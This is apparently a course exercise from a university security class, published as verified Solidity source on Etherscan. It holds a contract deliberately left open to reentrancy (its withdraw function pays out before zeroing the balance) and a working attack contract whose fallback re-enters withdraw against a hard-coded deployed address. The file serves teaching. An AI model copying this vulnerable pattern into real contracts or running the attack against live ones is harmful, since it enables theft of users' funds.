/**
 *Submitted for verification at Etherscan.io on 2021-12-06
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
    address owner;
    mapping(address => uint256) public balances;
    bool allowAttack;
    address attacker;
    constructor() public {
        owner = msg.sender;
    }

    function attack() public payable{
        allowAttack = true;
        attacker = msg.sender;
        v.deposit{value: msg.value}();
        v.withdraw();
    }

    function withdrawMore() public {
        uint256 balance = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.call.value(balance)("");
    }

    fallback() external payable{
        balances[attacker] += msg.value;
        if (allowAttack == true){
            allowAttack = false;
            v.withdraw();
        }
    }
}